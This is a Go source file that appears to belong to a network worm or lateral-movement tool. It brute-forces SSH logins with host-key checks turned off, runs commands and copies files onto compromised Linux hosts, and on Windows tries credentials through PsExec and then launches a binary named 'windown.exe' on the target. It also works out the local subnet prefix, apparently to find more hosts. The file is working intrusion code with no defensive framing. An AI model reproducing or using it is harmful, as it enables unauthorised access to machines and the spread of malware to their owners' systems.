package main

import (
	"os"
	"log"
	"golang.org/x/crypto/ssh"
	"fmt"
	"time"
	"strings"
	"bufio"
	"github.com/tmc/scp"
	"os/exec"
	"net"
	"regexp"
	"strconv"
	"github.com/go-openapi/errors"
)
// Struct to hold valid creds and session once discovered
type infosession struct {
	iswork bool
	username string
	password string
	ssh	*ssh.Client
	cmd *exec.Cmd

}
var authError = errors.New(1,"Unable to authenticate")
var unknownError = errors.New(2,"Unknown error")
var sessionError = errors.New(3,"Unable to create session")

// function to test usernames and passwords to a specific ip until valid credentials are hit
// returns an infosession and any errors
// Error code 1: Unable to authenticate
// Error code 2: Unknown error
func getinssh(myip string, user string, passwd string, port int64) (myreturn infosession, reterr error) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         2 * time.Second,
		Auth: []ssh.AuthMethod{
			ssh.Password(passwd)},
	}
	var dest= myip + ":" + strconv.FormatInt(port, 10)
	fmt.Println(dest)
	connection, err := ssh.Dial("tcp", dest, sshConfig)
	if err != nil {
		fmt.Println(err)
		if strings.Contains(err.Error(), "unable to authenticate") {
			return infosession{false,"","",nil,nil}, authError
		} else {
			return infosession{false,"","",nil,nil}, unknownError
		}
	}
	return infosession{true,user,passwd,connection, nil}, nil
}

// Creates session where commands can inputted from client
// Error code 1: Unable to create new session
func newsession(connection *ssh.Client) (session *ssh.Session, reterr error) {
	session, err := connection.NewSession()
	if err != nil {
		return nil, sessionError
	}
	return
}

// Executes desired linux command on machine with an active ssh session
// Returns any errors
func execlinuxcmd(session *ssh.Session, cmd string) (err error) {
	_, err = session.CombinedOutput(cmd)
	return
}

// Copies files from host to target machine
// Returns any errors
func scpexec(session *ssh.Session, srcfile string, destfile string) (err error) {
	err = scp.CopyPath(srcfile, destfile, session)
	return
}

// Attempts credentials until getting into the target windows machine using psexec
func getinwin(myip string, user string, passwd string) (infosession, error) {
	pscom := "PsExec.exe"
	iparg := "\\\\" + myip
	cmd := exec.Command(pscom, iparg, "-n", "5", "-u", user, "-p", passwd, "-accepteula", "cmd", "/c", "START", "/b", ".\\windown.exe")
	output, _ := cmd.CombinedOutput()
	strout := string(output)
	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { //true work case
		fmt.Println("exit 1")
		return infosession{true, user,passwd, nil, nil }, nil
	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true { //false case
		return infosession{}, authError
	} else { //psexec doesn't work
		return infosession{}, unknownError
	}
}

// Reads a file into an array
func readinfile(myfile string) (readinarr []string) {
	file, err := os.Open(myfile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		readinarr = append(readinarr, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return
}

// Returns outbound ip address
func GetOutboundIP() (myip string) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	myip = localAddr.IP.String()
	re := regexp.MustCompile(`.*\..*\.`)
	myip = re.FindString(myip)
	return myip
}
